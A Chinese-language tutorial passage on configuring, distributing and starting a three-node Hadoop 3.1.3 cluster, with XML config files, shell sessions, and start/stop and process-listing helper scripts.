<h4 id="配置集群"><a href="#配置集群" class="headerlink" title="配置集群"></a>配置集群</h4><h5 id="核心配置文件"><a href="#核心配置文件" class="headerlink" title="核心配置文件"></a>核心配置文件</h5><p>配置core-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd $HADOOP_HOME/etc/hadoop</span><br><span class="line">[huang@hadoop102 hadoop]$ vi core-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 NameNode 的地址 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop102:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 hadoop 数据的存储目录 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/module/hadoop-3.1.3/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 配置 HDFS 网页登录使用的静态用户为 huang --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.http.staticuser.user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>huang<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="HDFS配置文件"><a href="#HDFS配置文件" class="headerlink" title="HDFS配置文件"></a>HDFS配置文件</h5><p>配置hdfs-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi hdfs-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- nn web端访问地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 2nn web 端访问地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.secondary.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:9868<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="YARN配置文件"><a href="#YARN配置文件" class="headerlink" title="YARN配置文件"></a>YARN配置文件</h5><p>配置yarn-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi yarn-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 MR 走 shuffle --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 ResourceManager 的地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 环境变量的继承 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.env-whitelist<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAP RED_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="MapReduce配置文件"><a href="#MapReduce配置文件" class="headerlink" title="MapReduce配置文件"></a>MapReduce配置文件</h5><p>配置mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 MapReduce 程序运行在 Yarn 上 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.app.mapreduce.am.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="集群分发"><a href="#集群分发" class="headerlink" title="集群分发"></a>集群分发</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分发Hadoop</span></span><br><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分发jdk</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ xsync /opt/module/jdk1.8.0_212/</span><br></pre></td></tr></table></figure>

<h4 id="去hadoop103和hadoop104上查看分发情况"><a href="#去hadoop103和hadoop104上查看分发情况" class="headerlink" title="去hadoop103和hadoop104上查看分发情况"></a>去hadoop103和hadoop104上查看分发情况</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ ssh hadoop103</span><br><span class="line">Last failed login: Mon Jun 28 00:48:32 CST 2021 from hadoop103 on ssh:notty</span><br><span class="line">There was 1 failed login attempt since the last successful login.</span><br><span class="line">Last login: Mon Jun 28 00:47:23 2021 from hadoop102</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line"></span><br><span class="line">[huang@hadoop103 hadoop-3.1.3]$ ssh hadoop104</span><br><span class="line">Last login: Mon Jun 28 00:49:13 2021 from hadoop103</span><br><span class="line">[huang@hadoop104 ~]$ cat /opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml </span><br></pre></td></tr></table></figure>



<h3 id="群起集群"><a href="#群起集群" class="headerlink" title="群起集群"></a>群起集群</h3><h4 id="配置workers"><a href="#配置workers" class="headerlink" title="配置workers"></a>配置workers</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">该文件中不允许出现空格，结尾也不行</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同步所有节点配置文件</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /opt/module/hadoop-3.1.3/etc/</span><br><span class="line">==================== hadoop102 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line"></span><br><span class="line">sent 1,014 bytes  received 19 bytes  688.67 bytes/sec</span><br><span class="line">total size is 107,680  speedup is 104.24</span><br><span class="line">==================== hadoop103 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">etc/hadoop/</span><br><span class="line">etc/hadoop/workers</span><br><span class="line"></span><br><span class="line">sent 1,094 bytes  received 51 bytes  2,290.00 bytes/sec</span><br><span class="line">total size is 107,680  speedup is 94.04</span><br><span class="line">==================== hadoop104 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">etc/hadoop/</span><br><span class="line">etc/hadoop/workers</span><br><span class="line"></span><br><span class="line">sent 1,094 bytes  received 51 bytes  2,290.00 bytes/sec</span><br><span class="line">total size is 107,680  speedup is 94.04</span><br></pre></td></tr></table></figure>

<h4 id="启动集群"><a href="#启动集群" class="headerlink" title="启动集群"></a>启动集群</h4><p>1.如果集群是第一次启动，需要在hadoop102节点格式化NameNode(注意:格式化 NameNode，会产生新的集群 id，导致 NameNode 和 DataNode 的集群 id 不一致，集群找不到已往数据。如果集群在运行过程中报错，需要重新格式化 NameNode 的话，<strong>一定要先停 止 NameNode 和 DataNode 进程，并且要删除所有机器的 data 和 logs 目录，然后再进行格式化</strong>。)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hdfs namenode -format</span><br></pre></td></tr></table></figure>

<p>2.启动HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sbin/start-dfs.sh</span><br></pre></td></tr></table></figure>

<p>3.在配置了ResourceManage的节点（hadoop103）启动yarn</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ssh hadoop103</span><br><span class="line">Last login: Mon Jun 28 02:29:59 2021 from hadoop102</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh </span><br></pre></td></tr></table></figure>

<p>4.Web 端查看 HDFS 的 NameNode</p>
<ul>
<li><p>浏览器中输入:<a href="http://hadoop102:9870/">http://hadoop102:9870</a></p>
</li>
<li><p>查看 HDFS 上存储的数据信息</p>
</li>
</ul>
<p>5.Web 端查看 YARN 的 ResourceManager</p>
<ul>
<li><p>浏览器中输入:<a href="http://hadoop103:8088/">http://hadoop103:8088</a></p>
</li>
<li><p>查看 YARN 上运行的 Job 信息</p>
</li>
</ul>
<h4 id="集群测试"><a href="#集群测试" class="headerlink" title="集群测试"></a>集群测试</h4><h5 id="上传文件到集群"><a href="#上传文件到集群" class="headerlink" title="上传文件到集群"></a>上传文件到集群</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">小文件</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd wcinput/</span><br><span class="line">[huang@hadoop102 wcinput]$ vi word.txt</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -mkdir /input</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -put /opt/module/hadoop-3.1.3/wcinput/word.txt /input</span><br><span class="line">2021-06-28 12:15:59,028 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">大文件</span></span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -put /opt/software/jdk-8u212-linux-x64.tar.gz /</span><br><span class="line">2021-06-28 12:16:44,297 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">2021-06-28 12:16:46,064 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br></pre></td></tr></table></figure>

<h5 id="上传文件后查看文件存放在什么位置"><a href="#上传文件后查看文件存放在什么位置" class="headerlink" title="上传文件后查看文件存放在什么位置"></a>上传文件后查看文件存放在什么位置</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 wcinput]$ cd /opt/module/hadoop-3.1.3/data/dfs/data/current/BP-1650407707-10.211.55.4-1624852380753/current/finalized/subdir0/subdir0/</span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">总用量 191944</span><br><span class="line">-rw-rw-r--. 1 huang huang        64 6月  28 12:15 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 6月  28 12:15 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 6月  28 12:16 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 6月  28 12:16 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 6月  28 12:16 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 6月  28 12:16 blk_1073741827_1003.meta</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741825</span><br><span class="line">hello hadoop</span><br><span class="line">hadoop huangmingwang</span><br><span class="line">huang ming wang</span><br><span class="line">hadoop hello</span><br></pre></td></tr></table></figure>

<h5 id="拼接文件"><a href="#拼接文件" class="headerlink" title="拼接文件"></a>拼接文件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741826 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741827 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ tar -zxvf tmp.tar.gz </span><br><span class="line"></span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">总用量 382392</span><br><span class="line">-rw-rw-r--. 1 huang huang        64 6月  28 12:15 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 6月  28 12:15 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 6月  28 12:16 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 6月  28 12:16 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 6月  28 12:16 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 6月  28 12:16 blk_1073741827_1003.meta</span><br><span class="line">drwxr-xr-x. 7 huang huang      4096 4月   2 2019 jdk1.8.0_212</span><br><span class="line">-rw-rw-r--. 1 huang huang 195013152 6月  28 12:23 tmp.tar.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ rm -rf jdk-8u212-linux-x64.tar.gz </span><br><span class="line">[huang@hadoop102 software]$ ll</span><br><span class="line">总用量 330156</span><br><span class="line">-rw-rw-r--. 1 huang huang 338075860 6月  28 00:11 hadoop-3.1.3.tar.gz</span><br><span class="line">[huang@hadoop102 software]$ hadoop fs -get /jdk-8u212-linux-x64.tar.gz ./</span><br><span class="line">2021-06-28 12:28:24,662 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 software]$ ll</span><br><span class="line">总用量 520600</span><br><span class="line">-rw-rw-r--. 1 huang huang 338075860 6月  28 00:11 hadoop-3.1.3.tar.gz</span><br><span class="line">-rw-r--r--. 1 huang huang 195013152 6月  28 12:28 jdk-8u212-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>

<h5 id="执行wordcount程序"><a href="#执行wordcount程序" class="headerlink" title="执行wordcount程序"></a>执行wordcount程序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br></pre></td></tr></table></figure>

<h3 id="配置历史服务器"><a href="#配置历史服务器" class="headerlink" title="配置历史服务器"></a>配置历史服务器</h3><p>1.配置 mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /opt/module/hadoop-3.1.3/etc/hadoop/</span><br><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml</span><br></pre></td></tr></table></figure>

<p>在该文件中增加如下配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 历史服务器端地址 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:10020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 历史服务器 web 端地址 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:19888<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.分发配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/etc/</span><br></pre></td></tr></table></figure>

<p>3.在 hadoop102 启动历史服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ mapred --daemon start historyserve</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看是否启动</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ jps</span><br><span class="line">29072 JobHistoryServer</span><br><span class="line">29146 Jps</span><br><span class="line">16923 DataNode</span><br><span class="line">16748 NameNode</span><br><span class="line">17454 NodeManager</span><br></pre></td></tr></table></figure>

<h3 id="配置日志的聚集"><a href="#配置日志的聚集" class="headerlink" title="配置日志的聚集"></a>配置日志的聚集</h3><h3 id="集群启动和停止方式"><a href="#集群启动和停止方式" class="headerlink" title="集群启动和停止方式"></a>集群启动和停止方式</h3><h4 id="各个模块分开启动-x2F-停止（配置ssh是前提）常用"><a href="#各个模块分开启动-x2F-停止（配置ssh是前提）常用" class="headerlink" title="各个模块分开启动&#x2F;停止（配置ssh是前提）常用"></a>各个模块分开启动&#x2F;停止（配置ssh是前提）常用</h4><p>1.整体启动&#x2F;停止HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-dfs.sh/stop-dfs.sh</span><br></pre></td></tr></table></figure>

<p>2.整体启动&#x2F;停止YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-yarn.sh/stop-yarn.sh</span><br></pre></td></tr></table></figure>

<h4 id="各个服务逐一启动-x2F-停止"><a href="#各个服务逐一启动-x2F-停止" class="headerlink" title="各个服务逐一启动&#x2F;停止"></a>各个服务逐一启动&#x2F;停止</h4><p>1.分别启动&#x2F;停止HDFS组件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hdfs --daemon start/stop namenode/datanode/secondarynamenode</span><br></pre></td></tr></table></figure>

<p>2.启动&#x2F;停止YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn --daemon start/stop resourcemanager/nodemanager</span><br></pre></td></tr></table></figure>

<h3 id="编写Hadoop集群常用脚本"><a href="#编写Hadoop集群常用脚本" class="headerlink" title="编写Hadoop集群常用脚本"></a>编写Hadoop集群常用脚本</h3><h4 id="Hadoop-集群启停脚本-包含-HDFS，Yarn，Historyserver-myhadoop-sh"><a href="#Hadoop-集群启停脚本-包含-HDFS，Yarn，Historyserver-myhadoop-sh" class="headerlink" title="Hadoop 集群启停脚本(包含 HDFS，Yarn，Historyserver):myhadoop.sh"></a>Hadoop 集群启停脚本(包含 HDFS，Yarn，Historyserver):myhadoop.sh</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi myhadoop.sh</span><br></pre></td></tr></table></figure>

<p>文件内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">if [ $# -lt 1 ]</span><br><span class="line">then</span><br><span class="line">		echo &quot;No Args Input...&quot;</span><br><span class="line">		exit ; </span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">case $1 in </span><br><span class="line">&quot;start&quot;)</span><br><span class="line">	echo &quot; =================== 启动 hadoop 集群 ===================&quot;</span><br><span class="line">	echo &quot; --------------- 启动 hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/start-dfs.sh&quot; </span><br><span class="line">	echo &quot; --------------- 启动 yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/start-yarn.sh&quot;</span><br><span class="line">	echo &quot; --------------- 启动 historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon start historyserver&quot;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">	echo &quot; =================== 关闭 hadoop 集群 ===================&quot;</span><br><span class="line">	echo &quot; --------------- 关闭 historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon stop historyserver&quot;</span><br><span class="line">	echo &quot; --------------- 关闭 yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/stop-yarn.sh&quot; </span><br><span class="line">	echo &quot; --------------- 关闭 hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/stop-dfs.sh&quot;</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">   echo &quot;Input Args Error...&quot;</span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">赋予脚本执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x myhadoop.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分发脚本</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h4 id="查看三台服务器Java进程脚本：jpsall"><a href="#查看三台服务器Java进程脚本：jpsall" class="headerlink" title="查看三台服务器Java进程脚本：jpsall"></a>查看三台服务器Java进程脚本：jpsall</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi jpsall</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo =============== $host ===============</span><br><span class="line">  ssh $host jps</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">赋予执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x jpsall</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分发脚本</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h3 id="常用端口号"><a href="#常用端口号" class="headerlink" title="常用端口号"></a>常用端口号</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220049227.png" alt="image-20210628130455175"></p>
<h3 id="集群内时间同步"><a href="#集群内时间同步" class="headerlink" title="集群内时间同步"></a>集群内时间同步</h3><p>如果服务器在公网环境(能连接外网)，可以不采用集群时间同步，因为服务器会定期 和公网时间进行校准;</p>
